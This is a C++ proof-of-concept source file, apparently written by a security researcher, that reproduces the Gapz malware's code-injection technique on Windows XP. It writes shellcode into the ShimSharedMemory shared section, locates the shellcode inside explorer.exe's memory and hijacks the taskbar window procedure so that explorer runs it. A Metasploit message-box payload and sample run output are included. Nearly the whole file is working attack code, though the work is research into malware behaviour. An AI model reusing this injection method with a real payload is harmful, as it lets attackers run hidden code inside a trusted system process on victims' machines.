/*
    gapz_code_injection.py - win32.Gapz code injection via shared section
    Copyright (C) 2012 Axel "0vercl0k" Souchet - http://www.twitter.com/0vercl0k

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

    Documentations that refer to shared section as a way to inject code
        - http://blog.eset.com/2012/12/27/win32gapz-steps-of-evolution
        - http://www.blackhat.com/presentations/bh-europe-05/BH_EU_05-Cerrudo/BH_EU_05_Cerrudo.pdf - slide "Using shared sections on virus/rootkits/etc"

    Kudos to @matrosov from ESET for sharing the win32.gapz binary to complete my PoC.

    It has only been tested on a WinXP SP2 VM, here is an output:
    C:\Documents and Settings\0vercl0k\Bureau>gapz.exe
    1] Writing the shellcode in the shared section mapped in explorer.exe's address space
       Opening the section..OK
       Map-ing a view of this section in our address space..OK at 00910000 (57344 bytes).
       Writing the payload in the shared section..OK.

    2] Looking for the taskbar window, a pointer onto shellcode in the explorer's me
    mory and modify its windows procedure
       Where are you Shell_TrayWnd, where are you..OK.
       Retrieving its windows procedure..OK at 010460d8.
       Getting the shellcode address..
            Explorer.exe's PID: 424
            Looking for the marker in [00000000 - 00010000]..
            [...]
            Looking for the marker in [009d0000 - 009de000]..
            Writing 009ddec0 @ 009ddebc
            Writing 009ddec4 @ 009ddec0
            OK at 0x009ddebc.
               Setting the windows procedure ..OK.
               Pulling the trigger, BRAAAAAA
               Putting back its winproc
     3] Profit!
*/

#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <string.h>
#include <tlhelp32.h>
#include <string>

// ASCII marker
#define MARKER "I'm in ur address-space man!"
#define SIZE_MARKER strlen(MARKER)

// Declarations
#define STATUS_SUCCESS ((NTSTATUS)0)

typedef enum _SECTION_INHERIT {
  ViewShare = 1,
  ViewUnmap = 2
} SECTION_INHERIT, *PSECTION_INHERIT;

extern "C"
{
    NTSTATUS NTAPI ZwOpenSection(
      PHANDLE SectionHandle,
      ACCESS_MASK DesiredAccess,
      POBJECT_ATTRIBUTES ObjectAttributes
    );

    NTSTATUS NTAPI ZwClose(
      HANDLE Handle
    );

    NTSTATUS NTAPI ZwUnmapViewOfSection(
      HANDLE ProcessHandle,
      PVOID BaseAddress
    );

    NTSTATUS NTAPI ZwMapViewOfSection(
      HANDLE SectionHandle,
      HANDLE ProcessHandle,
      PVOID *BaseAddress,
      ULONG_PTR ZeroBits,
      SIZE_T CommitSize,
      PLARGE_INTEGER SectionOffset,
      PSIZE_T ViewSize,
      SECTION_INHERIT InheritDisposition,
      ULONG AllocationType,
      ULONG Win32Protect
    );
}

// Definitions

VOID fatal_error(PCHAR msg)
{
    fprintf(stderr, "%s\n", msg);
    ExitProcess(0);
}

DWORD find_marker_in_region(PCHAR buffer, DWORD size)
{
    if(SIZE_MARKER > size)
        fatal_error("Failed in" __FUNCTION__);
    
    for(DWORD i = 0; i < (size - SIZE_MARKER); ++i)
        if(memcmp(buffer + i, MARKER, SIZE_MARKER) == 0)
            return i;

    return 0xffffffff;
}

DWORD get_explorer_pid()
{
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32 = {0};
    DWORD explorer_pid = 0;

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hProcessSnap == INVALID_HANDLE_VALUE)
        fatal_error("Failed in " __FUNCTION__);

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if(!Process32First(hProcessSnap, &pe32))
        fatal_error("Failed in " __FUNCTION__);

    do
    {
        if(strcmp(pe32.szExeFile, "explorer.exe") == 0)
        {
            explorer_pid = pe32.th32ProcessID;
            break;
        }
    } while(Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    if(explorer_pid == 0)
        fatal_error("Failed in " __FUNCTION__);

    return explorer_pid;
}

DWORD find_marker_in_explorer(HANDLE hProcess, DWORD base_address_region, DWORD size_region)
{
    DWORD size_read;
    PCHAR buffer = (PCHAR)malloc(size_region);

    if(buffer == 0)
        fatal_error("Failed in " __FUNCTION__);

    if(ReadProcessMemory(
        hProcess,
        (LPVOID)base_address_region,
        buffer,
        size_region,
        &size_read
    ) == FALSE)
        return 0;

    DWORD idx_marker = find_marker_in_region(buffer, size_region);
    if(idx_marker == 0xffffffff)
        return 0;

    free(buffer);
    return base_address_region + idx_marker + SIZE_MARKER;
}

DWORD get_shellcode_address()
{
    HANDLE hProcess;
    DWORD pid_explorer = get_explorer_pid(), base_address = 0, shellcode_address = 0;
    MEMORY_BASIC_INFORMATION mem_info = {0};

    if(pid_explorer == 0)
        fatal_error("Failed in " __FUNCTION__);

    printf("        Explorer.exe's PID: %d\n", pid_explorer);
    hProcess = OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
        FALSE,
        pid_explorer
    );

    if(hProcess == NULL)
        fatal_error("Failed in " __FUNCTION__);

    while(TRUE)
    {
        DWORD bytes_read = VirtualQueryEx(
            hProcess,
            (PVOID)base_address,
            &mem_info,
            sizeof(mem_info)
        );

        if(bytes_read != sizeof(mem_info))
            return 0;

        printf("        Looking for the marker in [%.8x - %.8x]..\n", base_address, base_address + mem_info.RegionSize);
        if((shellcode_address = find_marker_in_explorer(hProcess, base_address, mem_info.RegionSize)) != 0)
            break;

        base_address += mem_info.RegionSize;
    }

    /*
        In the shared section we have:
        address: 0x1337 [0x0000133b][0x0000133f][Payload]

        CPU Disasm
        Address   Hex dump          Command                                  Comments
        01001B4A  |.  8B06          MOV EAX,DWORD PTR [ESI] ; ESI is a pointer on the value we give at SetWindowLong (that's why we need two indirection)
        01001B4C  |.  56            PUSH ESI
        01001B4D      FF10          CALL DWORD PTR [EAX]

        First, ESI=0x1337
        Then EAX = 0x133b
        Finally CALL [0x133b] = CALL 0x133f => BOOM    
    */
    DWORD first_indirection = shellcode_address + 4;
    printf("Writing %.8x @ %.8x\n", first_indirection, shellcode_address);
    WriteProcessMemory(
        hProcess,
        (PVOID)shellcode_address,
        &first_indirection,
        sizeof(DWORD),
        NULL
    );

    DWORD second_indirection = first_indirection + 4;
    printf("Writing %.8x @ %.8x\n", second_indirection, shellcode_address + 4);
    WriteProcessMemory(
        hProcess,
        (PVOID)(shellcode_address + 4),
        &second_indirection,
        sizeof(DWORD),
        NULL
    );

    return shellcode_address;
}

BOOL write_shellcode_in_shared_section()
{
    /*
    C:\metasploit\msf3>..\ruby\bin\ruby.exe msfpayload windows/messagebox TITLE="0vercl0k iz in your explorer man!" TEXT="Hi from the explorer dewd o/" P
    # windows/messagebox - 315 bytes
    # http://www.metasploit.com
    # VERBOSE=false, EXITFUNC=process, TITLE=0vercl0k iz in your explorer man!, TEXT=Hi from the explorer dewd o/, ICON=NO
    my $buf =
    "\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64" .
    "\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e" .
    "\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60" .
    "\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b" .
    "\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01" .
    "\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d" .
    "\x01\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x01" .
    "\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01" .
    "\xe8\x89\x44\x24\x1c\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89" .
    "\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45" .
    "\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff" .
    "\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64" .
    "\x68\x75\x73\x65\x72\x88\x5c\x24\x0a\x89\xe6\x56\xff\x55" .
    "\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c\x24\x52\xe8" .
    "\x61\xff\xff\xff\x68\x21\x58\x20\x20\x68\x20\x6d\x61\x6e" .
    "\x68\x6f\x72\x65\x72\x68\x65\x78\x70\x6c\x68\x6f\x75\x72" .
    "\x20\x68\x69\x6e\x20\x79\x68\x20\x69\x7a\x20\x68\x63\x6c" .
    "\x30\x6b\x68\x30\x76\x65\x72\x31\xdb\x88\x5c\x24\x21\x89" .
    "\xe3\x68\x58\x20\x20\x20\x68\x64\x20\x6f\x2f\x68\x20\x64" .
    "\x65\x77\x68\x6f\x72\x65\x72\x68\x65\x78\x70\x6c\x68\x74" .
    "\x68\x65\x20\x68\x72\x6f\x6d\x20\x68\x48\x69\x20\x66\x31" .
    "\xc9\x88\x4c\x24\x1c\x89\xe1\x31\xd2\x52\x53\x51\x52\xff" .
    "\xd0\x31\xc0\x50\xff\x55\x08";
    */
    UCHAR payload[] = "\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64\x68\x75\x73\x65\x72\x88\x5c\x24\x0a\x89\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c\x24\x52\xe8\x61\xff\xff\xff\x68\x21\x58\x20\x20\x68\x20\x6d\x61\x6e\x68\x6f\x72\x65\x72\x68\x65\x78\x70\x6c\x68\x6f\x75\x72\x20\x68\x69\x6e\x20\x79\x68\x20\x69\x7a\x20\x68\x63\x6c\x30\x6b\x68\x30\x76\x65\x72\x31\xdb\x88\x5c\x24\x21\x89\xe3\x68\x58\x20\x20\x20\x68\x64\x20\x6f\x2f\x68\x20\x64\x65\x77\x68\x6f\x72\x65\x72\x68\x65\x78\x70\x6c\x68\x74\x68\x65\x20\x68\x72\x6f\x6d\x20\x68\x48\x69\x20\x66\x31\xc9\x88\x4c\x24\x1c\x89\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0\x31\xc0\x50\xff\x55\x08";
    NTSTATUS result;
    BOOL ret = TRUE;
    HANDLE hSection = INVALID_HANDLE_VALUE;
    UNICODE_STRING obj_name = {0};
    OBJECT_ATTRIBUTES obj = {0};
    PUCHAR base_address_view = 0;
    SIZE_T viewsize = 0;

    RtlInitUnicodeString(&obj_name, L"\\BaseNamedObjects\\ShimSharedMemory");
    
    InitializeObjectAttributes(
        &obj,
        &obj_name,
        OBJ_CASE_INSENSITIVE,
        NULL,
        NULL
    );

    printf("   Opening the section..");
    result = ZwOpenSection(
        &hSection,
        GENERIC_WRITE,
        &obj
    );

    if(result != STATUS_SUCCESS)
    {
        printf("Failed in " __FUNCTION__ ": %.8x.\n", result);
        ret = FALSE;
        goto clean;
    }

    printf("OK\n");

    printf("   Map-ing a view of this section in our address space..");
    result = ZwMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        (PVOID*)&base_address_view,
        (ULONG_PTR)NULL,
        0,
        NULL,
        &viewsize,
        ViewUnmap,
        0,
        PAGE_READWRITE
    );

    if(result != STATUS_SUCCESS)
    {
        printf("Failed in " __FUNCTION__ ": %.8x.\n", result);
        ret = FALSE;
        goto clean;
    }

    printf("OK at %.8x (%d bytes).\n", base_address_view, viewsize);

    printf("   Writing the payload in the shared section..");
    memcpy((base_address_view + viewsize) - (sizeof(payload) + SIZE_MARKER + 4 + 4), MARKER, SIZE_MARKER);
    memcpy(((base_address_view + viewsize) - sizeof(payload)), payload, sizeof(payload));
    printf("OK.\n");

    clean:
    if(hSection != INVALID_HANDLE_VALUE)
    {
        ZwUnmapViewOfSection(GetCurrentProcess(), base_address_view);
        ZwClose(hSection);
    }
    
    return ret;
}

BOOL modify_winproc_taskbar_window()
{
    BOOL ret = TRUE;
    HWND hTaskbarWindow = FindWindow("Shell_TrayWnd", NULL);
    LONG taskbarWinproc = 0;
    DWORD shellcode_address = 0;

    printf("   Where are you Shell_TrayWnd, where are you..");
    if(hTaskbarWindow == 0)
    {
        printf("Failed in " __FUNCTION__ ".\n");
        ret = FALSE;
        goto clean;
    }

    printf("OK.\n");

    printf("   Retrieving its windows procedure..");
    taskbarWinproc = GetWindowLong(hTaskbarWindow, 0);

    if(taskbarWinproc == 0)
    {
        printf("Failed in " __FUNCTION__ ".\n");
        ret = FALSE;
        goto clean;
    }

    printf("OK at %.8x.\n", taskbarWinproc);

    printf("   Getting the shellcode address..\n");
    shellcode_address = get_shellcode_address();
    if(shellcode_address == 0)
    {
        printf("Failed in " __FUNCTION__ ".\n");
        ret = FALSE;
        goto clean;
    }

    printf("OK at 0x%.8x.\n", shellcode_address);

    printf("   Setting the windows procedure ..");
    SetWindowLong(hTaskbarWindow, 0, shellcode_address);
    printf("OK.\n");

    printf("   Pulling the trigger, BRAAAAAA\n");
    SendNotifyMessage(
        hTaskbarWindow,
        0xf,
        0,
        0
    );

    Sleep(1);

    printf("   Putting back its winproc\n");
    SetWindowLong(hTaskbarWindow, 0, taskbarWinproc);

    clean:
    return ret;
}

int main()
{
    printf("1] Writing the shellcode in the shared section mapped in explorer.exe's address space\n");
    if(write_shellcode_in_shared_section() == FALSE)
        return -1;

    printf("\n2] Looking for the taskbar window, a pointer onto shellcode in the explorer's memory and modify its windows procedure\n");
    if(modify_winproc_taskbar_window() == FALSE)
        return -1;

    printf("\n3] Profit!\n");
    return 0;
}
